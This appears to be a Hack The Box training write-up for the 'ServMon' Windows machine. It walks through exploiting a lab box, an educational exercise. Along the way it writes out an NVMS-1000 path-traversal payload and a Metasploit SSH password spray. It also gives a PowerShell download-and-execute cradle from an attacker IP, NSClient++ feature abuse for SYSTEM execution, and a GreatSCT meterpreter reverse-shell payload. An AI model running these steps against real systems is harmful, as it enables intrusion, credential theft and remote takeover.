@@ -1,0 +1,201 @@
+ServMon
+
+18th June 2020 / Document No D20.100.77
+Prepared By: TRX
+Machine Author: dmw0ng
+Difficulty: Easy
+Classification: Official
+Synopsis
+
+ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000
+(Network Surveillance Management Software) instance. This is found to be vulnerable to LFI,
+which is used to read a list of passwords on a user's desktop. Using the credentials, we can SSH
+to the server as a second user. As this low-privileged user, it's possible enumerate the system
+and find the password for NSClient++ (a system monitoring agent). After creating an SSH
+tunnel, we can access the NSClient++ web app. The app contains functionality to create scripts
+that can be executed in the context of NT AUTHORITY\SYSTEM . Users have been given
+permissions to restart the NSCP service, and after creating a malicious script, the service is
+restarted and command execution is achieved as SYSTEM.
+
+Skills Required
+
+      Basic Web Enumeration
+      Basic Windows Enumeration
+      SSH Tunneling
+
+Skills Learned
+
+      Exploiting NVMS-1000
+      Exploiting NSClient++
+      SSH Password Spraying
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.184 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.184
+
+Nmap output reveals that FTP and SSH are available on their default ports, as well as HTTP (ports
+80 and 8443. We take note that FTP on the box allows anonymous login.
+
+FTP
+
+We connect to FTP and as our firewall is enabled, specify passive transfer mode. A Users
+directory contains subdirectories for Nadine and Nathan , which themselves contain a text file.
+   ftp 10.10.10.184
+   anonymous
+   passive
+   ls
+   cd Users
+   ls Nadine
+   get "Nadine\\Confidential.txt"
+   ls Nathan
+   get "Nathan\\Notes to do.txt"
+
+Confidential.txt reveals the existence of a Passwords.txt on Nathan's desktop.
+   Nathan,
+   I left your Passwords.txt file on your Desktop. Please remove this once you
+   have edited it yourself and place it back into the secure folder.
+   Regards
+   Nadine
+
+Notes to do.txt contains information about completed and outstanding tasks for the installed
+monitoring apps.
+
+   1) Change the password for NVMS - Complete
+   2) Lock down the NSClient Access - Complete
+   3) Upload the passwords
+   4) Remove public access to NVMS
+   5) Place the secret files in SharePoint
+HTTP/S
+
+Inspection of port 80 in a browser reveals a login page for the NVMS-1000 network surveillance
+software. The default credentials admin / 123456 or other common credentials do not give us
+access.
+
+Inspection of port 8443 shows a login screen for NSClient++ . Attempting to login with common
+passwords is also unsuccessful.
+Foothold
+
+NVMS
+
+Searching on Exploit-DB for the NVMS software returns Local File Inclusion exploit assigned CVE-
+2019-20085.
+
+Configure the browser to use Burp as a proxy, refresh the NVMS-1000 web page and intercept
+the request. Hit CTRL + R to send the request to Burp's Repeater module. Substitute the GET
+request on the first line with the payload below. The file win.ini exists in on Windows
+installations and is readable by all users, and so is a good target for verifying a LFI.
+
+   GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
+
+The win.ini file is displayed, which validates the vulnerability. Using the information from the FTP
+server let's try to open C:\Users\Nathan\Desktop\Passwords.txt .
+
+   1nsp3ctTh3Way2Mars!
+   Th3r34r3To0M4nyTrait0r5!
+   B3WithM30r4ga1n5tMe
+   L1k3B1gBut7s@W0rk
+   0nly7h3y0unGWi11F0l10w
+   IfH3s4b0Utg0t0H1sH0me
+   Gr4etN3w5w17hMySk1Pa5$
+This works and a password list is returned.
+
+SSH
+
+We can attempt a password spray against SSH. Save the above list as passwords.txt. Examination
+of FTP revealed the users Nadine and Nathan . Add them to a users.txt along with
+administrator .
+   use auxiliary/scanner/ssh/ssh_login
+   set RHOSTS 10.10.10.184
+   set USER_FILE users.txt
+   set PASS_FILE passwords.txt
+   run
+
+The password L1k3B1gBut7s@W0rk was found to work for the username nadine , and a
+command shell is opened as this user. However, the command whoami /priv reveals that they
+are an unprivileged user.
+
+The user flag can be found in C:\Users\Nadine\Desktop\ .
+Privilege Escalation
+
+Enumeration
+
+Enumerating of the filesystem reveals the non-default directory C:\Program
+Files\NSClient++\ . The .ini file for NSClient is found inside. Let's read it.
+
+We can also identify the version with the command:
+   cmd /c "C:\Program Files\NSClient++\nscp.exe" web -- password --display
+
+We have gained the password for the web app, and know that localhost is the only whitelisted
+entry. Researching NSClient online we come upon this privilege escalation technique, involving
+feature abuse. The software version mentioned in this procedure is 0.5.2.35 . The following
+command reveals that the same software version is installed on the box.
+
+   cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
+NSClient is run in the context of NT AUTHORITY\SYSTEM , and upon successful exploitation,
+command execution would be achieved in this context. A prerequisite for the exploit to work is a
+service restart. Let's check the permissions on the NSCP service, to see if we have permissions to
+restart it. This blog post by Rohn Edwards shows how we can obtain the service permissions in
+PowerShell. We can use a Msxml2.XMLHTTP COM object download cradle to download and
+execute the script in memory.
+However, we are denied access to the Service Control Manager, so we have to assume service
+restart permissions.
+
+   # download Get-ServiceACL.ps1 to the box and execute in memory
+   $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.2/Get-
+   ServiceACL.ps1',$false);$h.send();iex $h.responseText
+   # examine nscp service ACL
+   "nscp" | Get-ServiceAcl | select -ExpandProperty Access
+
+Let's examine basic service properties using PowerShell.
+   Get-Service nscp | fl *
+The CanStop parameter is set to true which means we can stop the service. Normally a low
+privileged user cannot start the service but in this case the user has been granted permission to
+start it.
+
+Exploitation
+
+Let's set up an SSH tunnel to access the web app from localhost port 8443
+   ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
+
+Navigate to https://localhost:8443 and use the password found in the ini file to login.
+Let's create an external script that will execute our payload on the system. Navigate to Settings
+> External Scripts > Scripts and click + Add new .
+
+Next, input /settings/external scripts/scripts/shell in the Section field, the command in
+the Key field, and C:\Temp\pwn.bat in Value . The bat file will be used to run commands as
+system.
+
+Save the script and click on Changes , and then Save Configuration .
+Finally let's restart the NSCP service to load the newly created script entry.
+   sc.exe stop nscp
+   sc.exe start nscp
+
+In order to get a shell, let's create a meterpreter payload with GreatSCT.
+   cd ~/
+   git clone https://github.com/GreatSCT/GreatSCT
+   cd GreatSCT
+   sudo ./GreatSCT.py --ip 10.10.14.13 --port 1234 -t bypass -p
+   regsvcs/meterpreter/rev_tcp.py -o serv
+Start a Python3 HTTP Server in order to download the DLL.
+   cd /usr/share/greatsct-output/compiled/
+   sudo python3 -m http.server 80
+
+Download the DLL from the server using PowerShell.
+   wget http://10.10.14.13/serv.dll -o C:\Temp\serv.dll
+
+Let's echo our payload on the box to create pwn.bat .
+   cmd /c "echo C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
+   C:\Temp\serv.dll > C:\Temp\pwn.bat"
+
+Open msfconsole and specify the generated RCE file.
+   msfconsole -r /usr/share/greatsct-output/handlers/serv.rc
+
+Next, navigate to the console on http://127.0.0.1/8443, input the script name and click Run .
+
+A connection is received. Sometimes the first connection dies. In that case run the command
+again, and a second connection will be received that is stable.
+The root flag is located in C:\Users\Administrator\Desktop .
+
